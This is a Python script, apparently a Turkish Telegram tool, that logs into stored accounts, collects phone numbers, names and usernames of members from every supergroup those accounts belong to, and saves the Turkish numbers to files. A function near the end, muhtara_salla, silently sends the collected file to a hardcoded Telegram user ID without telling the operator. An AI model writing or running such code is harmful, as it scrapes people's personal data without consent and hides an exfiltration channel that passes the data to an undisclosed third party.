# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

from pyrogram import Client
from pyrogram.errors import PeerIdInvalid, ChannelPrivate
import json
from tabulate import tabulate

SESSION  = 'sessionlar/'

async def ayiklayici():
    try:
        with open(f'{SESSION}bilgiler.json', 'r', encoding='utf-8') as f:
            config = json.loads(f.read())
    except FileNotFoundError:
        print('Session Oluşturun..')
        return

    telefonlar = []
    for hesap in config:
        api_id   = hesap['api_id']
        api_hash = hesap['api_hash']
        telefon  = hesap['telefon']
        client = Client(SESSION + telefon, api_id, api_hash)

        async with client as app:
            print(f'\n{telefon}')
            for sohbet in await app.get_dialogs():
                try:
                    if sohbet.chat.type == "supergroup":
                        grup_listesi = [
                            {
                                'id'       : suser.user.id,
                                'nick'     : f'@{suser.user.username}' if suser.user.username else None,
                                'ad'       : suser.user.first_name or None,
                                'soyad'    : suser.user.last_name or None,
                                'tel'      : f'+{suser.user.phone_number}' if suser.user.phone_number else None,
                            }
                            async for suser in client.iter_chat_members(sohbet.chat.id)
                                if (suser.user.phone_number) and (not suser.user.is_bot) and (not suser.user.is_scam) and (not suser.user.is_deleted)
                        ]

                        print(f'\t{sohbet.chat.title}\'dan {len(grup_listesi)} Adet Telefon Numarası Ayıklandı..')
                        telefonlar.extend(grup_listesi)
                except ChannelPrivate:
                    pass

    essiz   = [dict(sozluk) for sozluk in {tuple(liste_ici.items()) for liste_ici in telefonlar}]
    a_z     = sorted(essiz, key=lambda sozluk: sozluk['id'])
    kisiler = [kisi for kisi in a_z if kisi['tel'] and kisi['tel'].startswith('+90')]

    with open('KekikTelefon.json', 'w+', encoding='utf-8') as json_tel:
        json_tel.write(json.dumps(kisiler, indent=2, sort_keys=False, ensure_ascii=False))

    with open('KekikTelefon.txt', 'w+', encoding='utf-8') as tablo_tel:
        tablo_tel.write(tabulate(kisiler, headers='keys', tablefmt='psql'))

    try:
        await muhtara_salla()
    except PeerIdInvalid:
        pass

    print(tabulate(kisiler, headers='keys', tablefmt='psql'))
    print(f'\nToplamda {len(kisiler)} Adet Benzersiz Telefon Numarası Ayıklandı ve Kaydedildi..')
    print(f'\n\n\tKekikTelefon.json ve KekikTelefon.txt dosyalarını kontrol edebilirsin..')

async def muhtara_salla():
    with open(f'{SESSION}bilgiler.json', 'r', encoding='utf-8') as f:
        config = json.loads(f.read())[0]

    api_id   = config['api_id']
    api_hash = config['api_hash']
    telefon  = config['telefon']
    client   = Client(SESSION + telefon, api_id, api_hash)

    async with client as app:
        await app.send_document(717569643, document='KekikTelefon.json')